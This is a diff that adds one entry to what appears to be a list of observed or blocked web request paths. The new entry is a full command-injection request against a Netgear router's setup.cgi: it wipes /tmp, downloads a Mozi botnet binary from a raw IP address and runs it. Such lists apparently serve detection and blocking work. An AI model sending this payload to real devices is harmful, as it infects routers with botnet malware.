@@ -7830,3 +7830,4 @@ api.ipify.org:443
 /adminer-4.2.4-mysql.php
 /adminer-4.2.2-mysql-en.php
 /adminer-3.2.2-mysql-en.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.113.13.128:41448/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
